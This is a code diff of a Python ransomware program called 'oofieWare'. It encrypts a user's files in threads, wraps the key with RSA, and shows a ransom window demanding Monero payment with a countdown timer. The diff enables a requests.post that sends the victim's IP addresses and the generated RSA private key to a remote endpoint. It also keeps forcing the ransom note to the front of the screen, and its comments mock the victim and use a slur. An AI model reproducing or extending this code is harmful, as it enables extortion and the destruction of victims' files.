@@ -23,9 +23,8 @@ class oofieWare:
         self.key = None
         self.enc_key = None
         self.encrypter = None
-        self.decrypter = None # Fernet(b'71CcgzEi0it8IQVpFkqjPyZxcckbN8VYnTBL2VQnoDg=')
+        self.decrypter = None
         self.threads = []
-        self.ransomWindow = None
         self.started = False
         self.startPoint = r'C:\Users\yaokh\Desktop\Target'
         # self.startPoint = os.path.expanduser("~")
@@ -42,9 +41,6 @@ class oofieWare:
         else:
             self.pubKey = '' # insert default val
 
-    def startPt(self):
-        return self.startPoint
-
     def gen_sym_key(self):
         secure_pw = os.urandom(32)
         salt = os.urandom(16)
@@ -58,17 +54,16 @@ class oofieWare:
 
         self.key = base64.urlsafe_b64encode(kdf.derive(secure_pw))
         self.encrypter = Fernet(self.key)
-        print(self.key)
 
     def gen_rsa_keypair(self):
         keyPair = RSA.generate(4096)
         self.privKey = keyPair.export_key()
         self.pubKey = keyPair.publickey()
-        # requests.post(self.ENDPOINT, data=json.dumps({
-        #     "PUBLIC_IP": self.PUBLIC_IP,
-        #     "PRIVATE_IP": self.PRIVATE_IP,
-        #     "PRIVATE_KEY": self.privKey
-        # }), headers={"Content-Type" : "application/json"})
+        requests.post(self.ENDPOINT, data=json.dumps({
+            "PUBLIC_IP": self.PUBLIC_IP,
+            "PRIVATE_IP": self.PRIVATE_IP,
+            "PRIVATE_KEY": self.privKey
+        }), headers={"Content-Type" : "application/json"})
         self.privKey = None
 
     def crypt_file(self, file_path):
@@ -97,7 +92,7 @@ class oofieWare:
                         y.write(dec_data)
                         y.close()
         except Exception as e:
-            print(f"Error detected at {file_path}\n {e}")
+            print(f"Error detected at {file_path}\n {e}") # for debugging purposes only
 
     def crypt_system(self):
         for root, dirs, files in os.walk(self.startPoint, topdown = True):
@@ -109,27 +104,24 @@ class oofieWare:
                     t = threading.Thread(target=self.crypt_file, args=(file_path,))
                     self.threads.append(t)
                     t.start()
-        # self.encrypter = None
 
     def wait_till_finish(self):
         for thr in self.threads:
             thr.join()
 
+        self.threads = []
+
     def encrypt_key(self):
-        print("entered enc func")
         self.encrypter = None
         enc_for_key = PKCS1_OAEP.new(self.pubKey)
-        print("created enc for key")
         self.enc_key = enc_for_key.encrypt(self.key)
-        print("created enc key")
         self.key = None
-        print("del key")
         with open (f"{self.Desktop}/IDENTIFIER.TXT", "wb") as id:
             id.write(self.enc_key)
             id.close()
 
-    def show_sym_key(self):
-        with open(r'C:\Users\yaokh\Desktop\Target\sym_key.txt', 'wb') as home:
+    def show_sym_key(self): # for debugging only
+        with open(fr'{self.Desktop}', 'wb') as home:
             home.write(self.key)
             home.close()
 
@@ -171,7 +163,7 @@ class oofieWare:
         TO DECRYPT YOUR FILES:
 
         1. Pay $200 in MONERO to this address: o845v9o3cn4o38cvo7tvcno8t7v94nvc7t9848947c
-        2. Email the file called "EMAIL_ME.pem" WHICH IS ON YOUR DESKTOP to astralcybergroup@astralcybergroup.com, along with screenshot of payment.
+        2. Email the file called "IDENTIFIER.txt" WHICH IS ON YOUR DESKTOP to oofiecybergroup@oofiecybergroup.com, along with screenshot of payment.
 
         If we can confirm that you paid, WE WILL SEND YOU THE KEY TO UNLOCK ALL YOUR FILES.
 
@@ -214,20 +206,25 @@ class oofieWare:
                 window.after(1000, countdown, '{}:{}:{}'.format(hour, minute, second)) 
         
         logoFrame = tk.Frame(bg='#000000')
+        titleFrame = tk.Frame(bg="#000000")
         frame1 = tk.Frame(bg="#000000")
         frame2 = tk.Frame(bg="#000000")
         countdownFrame = tk.Frame(bg="#000000")
 
-        skullLbl = tk.Label(text=SKULL, fg="#ff0000", bg="#000000", font="TkFixedFont", justify=tk.LEFT, master=logoFrame)
+        skullLbl = tk.Label(text=SKULL, fg="#00ff00", bg="#000000", font="TkFixedFont", justify=tk.LEFT, master=logoFrame)
         skullLbl.pack(pady=5)
 
-        mainPara = tk.Label(text=DESCRIPTION, fg="#ff0000", bg="#000000", font=("Arial", 15), master=frame2)
+        titleLbl = tk.Label(text='OOFIE HAS SEIZED THIS COMPUTER', fg="#00ff00", bg = "#000000", font=('Arial', 20), master=titleFrame)
+        titleLbl.pack(pady=5)
+
+        mainPara = tk.Label(text=DESCRIPTION, fg="#00ff00", bg="#000000", font=("Arial", 12), master=frame2)
         mainPara.pack(pady=10)
 
-        countdownLbl = tk.Label(fg="#ff0000", bg="#ffffff", font=("Arial", 30), master=countdownFrame)
+        countdownLbl = tk.Label(fg="#00ff00", bg="#000000", font=("Arial bold", 30), master=countdownFrame)
         countdownLbl.pack()
 
         logoFrame.pack(fill=tk.X)
+        titleFrame.pack(fill=tk.X)
         frame1.pack(fill=tk.X)
         frame2.pack(fill=tk.X)
         countdownFrame.pack(fill=tk.BOTH, expand=True)
@@ -238,7 +235,6 @@ class oofieWare:
 
         # eraseTimer.start()
 
-        self.ransomWindow = window
         window.mainloop()
 
     # def erase_system(self):
@@ -260,16 +256,13 @@ class oofieWare:
             topWindow = pg.getActiveWindow()
             if topWindow.title != "Ransom Note":
                 try:
-                    print("activated")
                     win = pg.getWindowsWithTitle('Ransom Note')[0]
                     win.minimize()
                     win.restore()
                 except:
                     continue
-            else:
-                print("is top window")
 
-            sleep(5)
+            sleep(10) # take away completely to annoy the fuck out of victim
 
     def detect_dec_key(self):
         DECRYPT_FILE_PATH = Path(fr"{self.Desktop}/DECRYPT.txt")
@@ -279,12 +272,15 @@ class oofieWare:
                     try:
                         with open(f"{self.Desktop}/DECRYPT.txt", "rb") as dec:
                             self.key = dec.read()
+                            # print(self.key)
                             self.decrypter = Fernet(self.key)
                             print("Decrypting...")
                             self.crypt_system()
+                            self.wait_till_finish()
                             break
                     except Exception as e:
                         print("Incorrect decryption key given.")
+                        print(e)
 
             except Exception as e:
                 pass
@@ -296,11 +292,11 @@ def attack():
     # oof.gen_sym_key()
     # oof.gen_rsa_keypair()
     # oof.crypt_system()
-    # oof.show_sym_key()
+    # oof.show_sym_key() # for debugging purposes, DON'T use this line irl
     # oof.wait_till_finish()
     # oof.encrypt_key()
-    elevate = threading.Thread(target = oof.elevate_ransom_window)
-    elevate.start()
+    # elevate = threading.Thread(target = oof.elevate_ransom_window)
+    # elevate.start()
     # detect = threading.Thread(target = oof.detect_dec_key)
     # detect.start()
     oof.show_ransom_window()
@@ -308,7 +304,3 @@ def attack():
 attack()
     
 # DONT be a retard and run this by accident
-
-# print(oofieWare().startPt())
-
-# print(os.listdir(r'C:\Users\yaokh\Desktop\Target'))
